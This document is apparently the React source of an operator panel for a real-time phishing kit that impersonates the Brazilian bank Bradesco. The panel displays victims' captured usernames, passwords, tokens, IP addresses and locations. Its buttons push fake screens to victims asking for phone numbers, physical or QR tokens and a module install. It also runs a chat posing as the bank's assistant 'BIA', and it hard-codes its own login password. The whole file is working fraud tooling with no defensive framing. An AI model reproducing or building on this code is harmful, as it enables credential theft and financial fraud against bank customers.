import { useEffect, useState, useRef } from 'react';
import { io, Socket } from 'socket.io-client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToastContext } from '@/contexts/ToastContext';

interface ClientSession {
  sessionId: string;
  usuario: string;
  senha: string;
  ip: string;
  pais: string;
  estado: string;
  cidade: string;
  device: string;
  status: string;
  telaAtual: string;
  conectadoEm: number;
  ultimaAtualizacao: number;
  token: string;
  ddd: string;
  telefone: string;
  mensagensBia: Array<{ de: string; texto: string; ts: number }>;
  avatarBia: string;
  nomeEnviado: string;
  serialEnviado: string;
  qrCodeEnviado: string;
  referencia: string;
}

export default function AdminPanel() {
  const toast = useToastContext();
  const socketRef = useRef<Socket | null>(null);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginPassword, setLoginPassword] = useState('');
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [selectedSession, setSelectedSession] = useState<ClientSession | null>(null);
  const [nome, setNome] = useState('');
  const [serial, setSerial] = useState('');
  const [biaMessage, setBiaMessage] = useState('');
  const [qrCodePreview, setQrCodePreview] = useState('');
  const [currentPage, setCurrentPage] = useState<'dashboard' | 'acessos' | 'operacao' | 'chat' | 'config'>('operacao');

  const handleLogin = async () => {
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: loginPassword }),
      });
      const data = await response.json();
      if (data.success) {
        setIsAuthenticated(true);
        sessionStorage.setItem('admin_auth', 'true');
      } else {
        toast.error('Erro', 'Senha incorreta');
      }
    } catch (err) {
      toast.error('Erro', 'Falha na conexão');
    }
  };

  useEffect(() => {
    if (sessionStorage.getItem('admin_auth') === 'true') {
      setIsAuthenticated(true);
    }
  }, []);

  useEffect(() => {
    if (!isAuthenticated || socketRef.current) return;

    const newSocket = io('/', {
      query: { role: 'operator' },
      reconnection: true,
      transports: ['websocket', 'polling'],
    });

    newSocket.on('connect', () => {
      toast.success('Conectado', 'Operador conectado ao servidor');
    });

    newSocket.on('operator:sessions', (data: ClientSession[]) => {
      setSessions(data);
      setSelectedSession(prevSession => {
        if (prevSession) {
          const updated = data.find(s => s.sessionId === prevSession.sessionId);
          return updated || prevSession;
        }
        return null;
      });
    });

    socketRef.current = newSocket;

    return () => {
      if (socketRef.current) {
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, [isAuthenticated]);

  const socket = socketRef.current;

  const sendCommand = (command: string) => {
    if (!socket || !selectedSession) return;
    socket.emit('operator:command', { sessionId: selectedSession.sessionId, command });
    toast.success('Comando', `"${command}" enviado`);
  };

  const sendInfo = () => {
    if (!socket || !selectedSession || !nome || !serial) {
      toast.error('Erro', 'Preencha Nome e Serial');
      return;
    }
    socket.emit('operator:enviar-info', { sessionId: selectedSession.sessionId, nome, serial });
    toast.success('Info', 'Dados enviados');
    setNome('');
    setSerial('');
  };

  const sendBiaMessage = () => {
    if (!socket || !selectedSession || !biaMessage.trim()) {
      toast.error('Erro', 'Digite uma mensagem');
      return;
    }
    socket.emit('operator:bia-message', { sessionId: selectedSession.sessionId, texto: biaMessage });
    toast.success('BIA', 'Mensagem enviada');
    setBiaMessage('');
  };

  const handleQRCodeUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        setQrCodePreview(event.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const sendQRCode = () => {
    if (!socket || !selectedSession || !qrCodePreview) {
      toast.error('Erro', 'Selecione um QR Code');
      return;
    }
    socket.emit('operator:qrcode', { sessionId: selectedSession.sessionId, qrCode: qrCodePreview });
    toast.success('QR Code', 'QR Code enviado');
    setQrCodePreview('');
  };

  const deleteSession = (sessionId: string) => {
    if (!socket) return;
    socket.emit('operator:delete-session', { sessionId });
    toast.success('Sessão', 'Sessão deletada');
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
        <div className="bg-slate-800 p-8 rounded-lg border border-slate-700 w-full max-w-md shadow-2xl">
          <div className="text-center mb-8">
            <div className="text-4xl font-bold text-red-600 mb-2">B</div>
            <h1 className="text-xl font-bold text-white">Painel Administrativo</h1>
            <p className="text-slate-400 text-sm">Insira a senha para acessar</p>
          </div>
          <div className="space-y-4">
            <Input
              type="password"
              placeholder="Senha de acesso"
              value={loginPassword}
              onChange={(e) => setLoginPassword(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
              className="bg-slate-700 border-slate-600 text-white"
            />
            <Button onClick={handleLogin} className="w-full bg-red-600 hover:bg-red-700 text-white font-bold">
              Entrar
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-900 text-white flex">
      {/* Sidebar */}
      <div className="w-56 bg-slate-950 border-r border-slate-800 flex flex-col">
        <div className="p-4 border-b border-slate-800">
          <div className="text-2xl font-bold text-red-600">B</div>
          <div className="text-xs text-slate-400 mt-1">Bradesco Admin</div>
        </div>

        <nav className="flex-1 p-4 space-y-2">
          {[
            { id: 'dashboard', label: 'Dashboard' },
            { id: 'acessos', label: 'Acessos' },
            { id: 'operacao', label: 'Operar Acesso' },
            { id: 'chat', label: 'Chat BIA' },
            { id: 'config', label: 'Configurações' },
          ].map(item => (
            <button
              key={item.id}
              onClick={() => setCurrentPage(item.id as any)}
              className={`w-full text-left px-3 py-2 rounded text-sm font-medium transition ${
                currentPage === item.id ? 'bg-red-600 text-white' : 'text-slate-300 hover:bg-slate-800'
              }`}
            >
              {item.label}
            </button>
          ))}
        </nav>

        <div className="p-4 border-t border-slate-800">
          <button 
            onClick={() => { setIsAuthenticated(false); sessionStorage.removeItem('admin_auth'); }}
            className="w-full px-3 py-2 rounded text-sm font-medium text-slate-300 hover:bg-slate-800 transition"
          >
            Sair
          </button>
        </div>
      </div>

      {/* Conteúdo Principal */}
      <div className="flex-1 p-6 overflow-auto">
        {currentPage === 'dashboard' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Dashboard</h1>
            <div className="grid grid-cols-4 gap-4">
              <div className="bg-slate-800 p-4 rounded-lg border border-slate-700">
                <div className="text-slate-400 text-sm">Sessões Ativas</div>
                <div className="text-2xl font-bold">{sessions.filter(s => s.status === 'online').length}</div>
              </div>
              <div className="bg-slate-800 p-4 rounded-lg border border-slate-700">
                <div className="text-slate-400 text-sm">Total de Acessos</div>
                <div className="text-2xl font-bold">{sessions.length}</div>
              </div>
            </div>
          </div>
        )}

        {currentPage === 'acessos' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Lista de Acessos</h1>
            <div className="bg-slate-800 rounded-lg border border-slate-700 overflow-hidden">
              <table className="w-full text-left text-sm">
                <thead className="bg-slate-900 text-slate-400">
                    <tr>
                    <th className="p-3">Usuário</th>
                    <th className="p-3">IP</th>
                    <th className="p-3">Localização</th>
                    <th className="p-3">Dispositivo</th>
                    <th className="p-3">Status</th>
                    <th className="p-3">Ações</th>
                  </tr>
                </thead>
                <tbody>
                  {sessions.map(s => (
                    <tr key={s.sessionId} className="border-t border-slate-700 hover:bg-slate-700/50">
                      <td className="p-3">{s.usuario || '—'}</td>
                      <td className="p-3">{s.ip}</td>
                      <td className="p-3">{s.cidade}, {s.estado}</td>
                      <td className="p-3 text-xs text-slate-400">{s.device}</td>
                      <td className="p-3">
                        <span className={`px-2 py-1 rounded-full text-[10px] ${s.status === 'online' ? 'bg-green-900 text-green-400' : 'bg-slate-900 text-slate-400'}`}>
                          {s.status}
                        </span>
                      </td>
                      <td className="p-3">
                        <Button onClick={() => { setSelectedSession(s); setCurrentPage('operacao'); }} size="sm" className="bg-blue-600 mr-2">Operar</Button>
                        <Button onClick={() => deleteSession(s.sessionId)} size="sm" variant="destructive">Excluir</Button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {currentPage === 'operacao' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Operar Acesso</h1>
            <div className="grid grid-cols-3 gap-6">
              {/* Sessões */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Sessões Ativas</h2>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {sessions.map(s => (
                    <button
                      key={s.sessionId}
                      onClick={() => setSelectedSession(s)}
                      className={`w-full text-left p-3 rounded text-sm transition ${
                        selectedSession?.sessionId === s.sessionId ? 'bg-red-600 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'
                      }`}
                    >
                      <div className="font-bold">{s.usuario || 'Anônimo'}</div>
                      <div className="text-xs">{s.ip}</div>
                      <div className="text-xs">{s.cidade}, {s.estado}</div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Dados em Tempo Real */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Dados em Tempo Real</h2>
                {selectedSession ? (
                  <div className="space-y-3 text-sm">
                    <div><div className="text-slate-400">Usuário</div><div className="font-normal">{selectedSession.usuario || '—'}</div></div>
                    <div><div className="text-slate-400">Senha</div><div className="font-mono text-red-400">{selectedSession.senha || '—'}</div></div>
                    <div><div className="text-slate-400">IP</div><div className="font-mono">{selectedSession.ip}</div></div>
                    <div><div className="text-slate-400">Localização</div><div className="font-mono">{selectedSession.cidade}, {selectedSession.estado}</div></div>
                    <div><div className="text-slate-400">Dispositivo</div><div className="font-mono">{selectedSession.device}</div></div>
                    <div><div className="text-slate-400">Tela Atual</div><div className="font-mono text-yellow-400">{selectedSession.telaAtual}</div></div>
                    <div><div className="text-slate-400">Token</div><div className="font-mono text-green-400">{selectedSession.token || '—'}</div></div>
                    <div><div className="text-slate-400">Referência</div><div className="font-mono text-blue-400">{selectedSession.referencia || '—'}</div></div>
                  </div>
                ) : <div className="text-slate-500">Selecione uma sessão</div>}
              </div>

              {/* Enviar Informações */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Enviar Informações</h2>
                <div className="space-y-3">
                  <Input value={nome} onChange={(e) => setNome(e.target.value)} placeholder="Nome" className="bg-slate-700 border-slate-600 text-white" />
                  <Input value={serial} onChange={(e) => setSerial(e.target.value)} placeholder="Serial" className="bg-slate-700 border-slate-600 text-white" />
                  <Button onClick={sendInfo} className="w-full bg-red-600 hover:bg-red-700 text-white">Enviar</Button>
                  
                  <div className="pt-4 border-t border-slate-700">
                    <h3 className="text-sm font-bold mb-2">Enviar QR Code</h3>
                    <input type="file" accept="image/*" onChange={handleQRCodeUpload} className="text-xs mb-2 w-full" />
                    {qrCodePreview && <img src={qrCodePreview} className="w-20 h-20 mb-2 rounded border border-slate-600" />}
                    <Button onClick={sendQRCode} className="w-full bg-blue-600 hover:bg-blue-700 text-xs">Enviar QR Code</Button>
                  </div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-6">
              {/* Ações de Controle */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Ações de Controle</h2>
                <div className="grid grid-cols-3 gap-2">
                  {['Tela de Login', 'Aguarde / Senha Incorreta', 'Pedir Celular', 'Pedir Token Tela', 'Pedir Token Físico', 'Pedir Token QR Code', 'Erro Token', 'Erro Celular', 'Desbloqueio BIA', 'Erro Desbloqueio BIA', 'Instalar Modulo', 'Validar Modulo'].map(cmd => (
                    <Button key={cmd} onClick={() => sendCommand(cmd)} className="bg-slate-700 hover:bg-red-600 text-[10px] h-10 px-1">{cmd}</Button>
                  ))}
                </div>
              </div>

              {/* Chat BIA Integrado */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700 flex flex-col h-[400px]">
                <h2 className="text-lg font-bold mb-4">Chat BIA</h2>
                {selectedSession ? (
                  <>
                    <div className="flex-1 bg-slate-900 rounded p-3 overflow-y-auto mb-3 space-y-2">
                      {selectedSession.mensagensBia.map((msg, i) => (
                        <div key={i} className={`flex ${msg.de === 'operador' ? 'justify-end' : 'justify-start'}`}>
                          <div className={`max-w-[85%] p-2 rounded text-[11px] ${msg.de === 'operador' ? 'bg-red-600' : 'bg-slate-700'}`}>
                            {msg.texto}
                          </div>
                        </div>
                      ))}
                    </div>
                    <div className="flex gap-2">
                      <Input value={biaMessage} onChange={(e) => setBiaMessage(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendBiaMessage()} placeholder="Mensagem..." className="bg-slate-700 border-slate-600 text-xs h-8" />
                      <Button onClick={sendBiaMessage} size="sm" className="bg-red-600 h-8">Enviar</Button>
                    </div>
                  </>
                ) : <div className="flex-1 flex items-center justify-center text-slate-500 text-sm">Selecione uma sessão</div>}
              </div>
            </div>
          </div>
        )}

        {currentPage === 'chat' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Chat BIA (Geral)</h1>
            <div className="grid grid-cols-4 gap-6 h-[600px]">
              <div className="bg-slate-800 rounded-lg border border-slate-700 overflow-y-auto">
                {sessions.map(s => (
                  <button
                    key={s.sessionId}
                    onClick={() => setSelectedSession(s)}
                    className={`w-full text-left p-3 border-b border-slate-700 transition ${selectedSession?.sessionId === s.sessionId ? 'bg-red-600' : 'hover:bg-slate-700'}`}
                  >
                    <div className="font-bold text-sm">{s.usuario || s.ip}</div>
                    <div className="text-[10px] text-slate-300">{s.mensagensBia.length} mensagens</div>
                  </button>
                ))}
              </div>
              <div className="col-span-3 bg-slate-800 rounded-lg border border-slate-700 flex flex-col">
                {selectedSession ? (
                  <>
                    <div className="p-3 border-b border-slate-700 font-bold">Chat com {selectedSession.usuario || selectedSession.ip}</div>
                    <div className="flex-1 p-4 overflow-y-auto space-y-3">
                      {selectedSession.mensagensBia.map((msg, i) => (
                        <div key={i} className={`flex ${msg.de === 'operador' ? 'justify-end' : 'justify-start'}`}>
                          <div className={`max-w-[70%] p-3 rounded-lg text-sm ${msg.de === 'operador' ? 'bg-red-600 text-white' : 'bg-slate-700 text-white'}`}>
                            {msg.texto}
                          </div>
                        </div>
                      ))}
                    </div>
                    <div className="p-4 border-t border-slate-700 flex gap-2">
                      <Input value={biaMessage} onChange={(e) => setBiaMessage(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendBiaMessage()} placeholder="Digite sua mensagem..." className="bg-slate-900 border-slate-700" />
                      <Button onClick={sendBiaMessage} className="bg-red-600">Enviar</Button>
                    </div>
                  </>
                ) : <div className="flex-1 flex items-center justify-center text-slate-500">Selecione um chat</div>}
              </div>
            </div>
          </div>
        )}

        {currentPage === 'config' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Configurações</h1>
            <div className="bg-slate-800 p-6 rounded-lg border border-slate-700 max-w-md">
              <h2 className="text-lg font-bold mb-4">Segurança</h2>
              <div className="space-y-4">
                <div>
                  <label className="text-sm text-slate-400">Senha do Painel</label>
                  <Input value="151612" disabled className="bg-slate-900 border-slate-700 text-slate-500" />
                  <p className="text-[10px] text-slate-500 mt-1">A senha é fixa conforme solicitado.</p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
